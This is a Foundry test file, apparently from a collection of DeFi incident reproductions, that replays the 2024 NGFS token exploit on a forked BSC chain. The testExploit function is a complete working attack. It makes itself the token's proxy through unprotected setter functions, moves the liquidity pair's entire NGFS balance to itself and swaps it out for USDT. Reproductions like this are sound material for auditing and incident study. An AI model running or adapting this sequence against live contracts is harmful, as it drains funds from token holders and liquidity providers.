// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost: ~190K
// Attacker: https://bscscan.com/address/0xd03d360dfc1dac7935e114d564a088077e6754a0
// Attack Contract: https://bscscan.com/address/0xc73781107d086754314f7720ca14ab8c5ad035e4
// Vulnerable Contract: https://bscscan.com/address/0xa608985f5b40cdf6862bec775207f84280a91e3a
// Attack Tx: https://bscscan.com/tx/0x8ff764dde572928c353716358e271638fa05af54be69f043df72ad9ad054de25

// @Info
// Vulnerable Contract Code: https://bscscan.com/address/0xa608985f5b40cdf6862bec775207f84280a91e3a#code

// @Analysis
// Post-mortem: https://louistsai.vercel.app/p/2024-04-25-ngfs-exploit/
// Twitter Guy: https://twitter.com/CertiKAlert/status/1783476515331616847
// Hacking God:

interface IPancakeFactory {
    function getPair(address, address) external returns (address);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface INGFSToken {
    function delegateCallReserves() external;
    function setProxySync(address) external;
    function balanceOf(address) external view returns (uint256);
    function reserveMultiSync(address, uint256) external;
    function approve(address, uint256) external returns (bool);
}

interface IBEP20 {
    function balanceOf(address) external view returns (uint256);
}

contract NGFS is Test {
    uint256 constant BLOCKNUM_TO_FORK_FROM = 38_167_372;
    address constant PANCAKE_FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant NGFS_TOKEN = 0xa608985f5b40CDf6862bEC775207f84280a91E3A;
    address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;

    function setUp() public {
        vm.createSelectFork("bsc", BLOCKNUM_TO_FORK_FROM);
    }

    function testExploit() public {
        uint256 tokenBalanceBefore = IBEP20(USDT_TOKEN).balanceOf(address(this));
        emit log_named_decimal_uint("Attacker USDT Balance Before exploit", tokenBalanceBefore, 18);

        address pair = IPancakeFactory(PANCAKE_FACTORY).getPair(NGFS_TOKEN, USDT_TOKEN);
        INGFSToken(NGFS_TOKEN).delegateCallReserves();
        INGFSToken(NGFS_TOKEN).setProxySync(address(this));

        uint256 balance = INGFSToken(NGFS_TOKEN).balanceOf(pair);
        INGFSToken(NGFS_TOKEN).reserveMultiSync(address(this), balance);

        uint256 amount = INGFSToken(NGFS_TOKEN).balanceOf(address(this));
        INGFSToken(NGFS_TOKEN).approve(PANCAKE_ROUTER, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = NGFS_TOKEN;
        path[1] = USDT_TOKEN;

        uint256 deadline = 1_714_043_885;
        IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            deadline
        );

        uint256 tokenBalanceAfter = IBEP20(USDT_TOKEN).balanceOf(address(this));
        // Log balances after exploit
        emit log_named_decimal_uint("Attacker USDT Balance After exploit", tokenBalanceAfter - tokenBalanceBefore, 18);
    }
}